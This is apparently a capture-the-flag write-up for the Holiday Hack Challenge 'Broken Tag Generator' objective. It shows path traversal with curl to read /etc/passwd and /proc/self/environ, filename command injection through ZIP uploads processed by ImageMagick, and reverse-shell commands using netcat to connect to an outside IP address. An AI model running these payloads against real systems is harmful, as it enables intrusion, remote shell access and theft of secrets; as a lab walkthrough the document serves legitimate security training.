# Objective 8: Broken Tag Generator

The objective is to obtain the value of the environment variable `GREETZ` of the [Tag Generator](https://tag-generator.kringlecastle.com/).

## Solution using Path Traversal

It was found that the image download function allows path traversal:
```
curl https://tag-generator.kringlecastle.com/image?id=../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
[...]
```
Using this the value the environment variable can be obtained like this:
```
curl https://tag-generator.kringlecastle.com/image?id=../../../../../proc/self/environ --output -
PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app
```
So the `GREETZ` variable contains **JackFrostWasHere**

## Solution using RCE

The [Ruby application code](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-8/app.rb) can be downloaded through the above path traversal:
```
curl https://tag-generator.kringlecastle.com/image?id=../../../../../app/lib/app.rb --output app.rb
```
This code allows to place uploaded files in a chosen place on the remote system using the ZIP upload function.
Furthermore the application starts the `convert` tool from  ImageMagick which makes it possible to inject shell commands:
```
touch joergen.jpg
zip joergen.zip joergen.jpg
printf "@ joergen.jpg\n@=\';nc 93.211.52.129 4444 -e \`which bash\`;#'.jpg\n" | zipnote -w joergen.zip

jsw@io:*$ touch \'\`env\>joergen\`\;\'.jpg
jsw@io:*$ zip joergen.zip \'\`env\>joergen\`\;\'.jpg
  adding: '`env>joergen`;'.jpg (stored 0%)
jsw@io:*$ curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
["7ebc17be-a3ea-48f5-95ea-730e1b006520.jpg"]
jsw@io:*$ sleep 5
jsw@io:*$ curl https://tag-generator.kringlecastle.com/image?id=../tmp/joergen
RUBY_MAJOR=2.7
GREETZ=JackFrostWasHere
[..]
```

## Full Interactive Remote Shell
Create a file for executing a reverse shell named `t.jpg`:
```
nc <your IP address> 4444 -e /bin/bash
```
Create an executor file:
```
touch \'\`bash\ t.jpg\`\;\'.jpg
```
Create the ZIP file including these two file for upload:
```
zip joergen.zip t.jpg \'\`bash\ t.jpg\`\;\'.jpg
```
Start the reverse shell listener on your local device:
```
nc -lnvp 4444
```
Get it started:
```
curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
```
Now you have in the reverse shell listener an interactive shell as user `app`.

```
touch \'\;nc\ 93.211.52.129\ 4444\ -e\ bash\;#\'.jpg
zip joergen.zip \'\;nc\ 93.211.52.129\ 4444\ -e\ bash\;#\'.jpg 
curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'


```
<!--stackedit_data:
eyJoaXN0b3J5IjpbMjEwNTc3NjA3NiwtODIzMDUwODYxLDEyOT
M3MjA0MzksMTM5NTc5NDgyNCwtMTU5OTI1NDQxNSwtNjE5Mjk3
NDExLC01NzY2MTAwNzUsMjEwNzUyOTg0Niw5MjIxNDQzNSwtMz
k4NDkxNDYxLDExNTE1NTY4OTYsMjM4NDYwMjcyLDE5MzMzNjE3
ODcsLTE0Njc2MTUyNjIsLTI0Mzk0Mjg2NiwxMzEyMDU2NDUzLD
kyMDQ1NTg2NSwtMTYwNjA3ODA0MF19
-->